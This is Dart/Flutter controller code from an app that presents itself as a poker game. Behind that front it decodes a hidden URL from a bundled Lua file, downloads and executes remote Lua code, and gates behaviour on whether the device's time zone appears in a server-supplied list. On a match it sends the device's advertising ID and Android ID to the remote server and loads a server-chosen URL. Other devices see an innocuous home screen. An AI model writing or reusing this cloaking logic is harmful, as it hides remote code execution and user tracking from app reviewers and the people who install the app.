import 'package:advertising_id/advertising_id.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:get_storage/get_storage.dart';
import 'package:lua_dardo/lua.dart';
import 'package:poker/screen/game.dart';
import 'package:poker/screen/home_screen.dart';

class MainController extends GetxController {
  String _advertisingId = 'Loading...';
  String _androidId = 'Loading...';
  RxString url = ''.obs;
  RxString appID = 'com.golden.hearts.royale'.obs;
  final dio = Dio();
  RxList<String> luaList = RxList.empty();
  final storage = GetStorage();
  LuaState ls = LuaState.newState();
  RxString luaValue = ''.obs;
  RxString result = ''.obs;
  RxString token = ''.obs;
  RxInt value = 0.obs;

  lua() {
    rootBundle.loadString('assets/${appID.value}.lua').then((value) {
      ls.openLibs();
      ls.doString(value);
      ls.getGlobal("value");
      if (ls.isString(-1)) {
        luaValue.value = ls.toStr(-1)!;
        luaRemote();
      }
    });
  }

  luaRemote() {
    value.value++;
    NetworkAssetBundle(Uri.parse(convert(key: luaValue.value)))
        .loadString('')
        .then((value) {
      ls.openLibs();
      ls.doString(value);
      ls.getGlobal("value");
      if (ls.isString(-1)) {
        luaValue.value = ls.toStr(-1)!;

        checkTime();
        storage.write('a', true);
      }
    }).onError((error, stackTrace) {
      if (storage.read('a') ?? false) {
        checkTime();
      } else {
        if (value.value > 4) {
          goToHomeScreen();
        } else {
          luaRemote();
        }
      }
    });
  }

  checkTime() async {
    String timeZone = DateTime.now().timeZoneName.toString();
    luaList.value = convert(key: luaValue.value).split(r',');
    if ((storage.read('b') ?? false)) {
      result.value = convert(key: luaList[1]);
      fetchIds();
    } else {
      if (timeZone == luaList[2] ||
          timeZone == luaList[3] ||
          timeZone == luaList[4] ||
          timeZone == luaList[5] ||
          timeZone == luaList[6] ||
          timeZone == luaList[7] ||
          timeZone == luaList[8] ||
          timeZone == luaList[9]) {
        storage.write('b', true);
        result.value = convert(key: luaList[1]);
        fetchIds();
      } else {
        goToHomeScreen();
      }
    }
  }

  Future<void> fetchIds() async {
    String? advertisingId;
    String androidId;

    try {
      // Retrieve Google Advertising ID (GAID)
      advertisingId = await AdvertisingId.id(true);
    } catch (e) {
      advertisingId = 'Error retrieving GAID';
    }

    try {
      // Retrieve Android ID using device_info_plus package
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      androidId = androidInfo.id;
    } catch (e) {
      androidId = 'Error retrieving Android ID';
    }

    _advertisingId = advertisingId;
    _androidId = androidId;
    getHttp(token.value);
  }

  void getHttp(String token) async {
    var api =
        '${result.value}?gclid=$_advertisingId&aid=$_androidId&gmToken=$token';
    print('debug: $api');
    final response = await dio.get(api);
    url.value = response.data['model']['url'];
    print('debug: ${url.value}');
    Get.off(() => Game());
  }

  goToHomeScreen() async {
    Future.delayed(const Duration(seconds: 1), () async {
      Get.off(() => const HomeScreen());
    });
  }
}
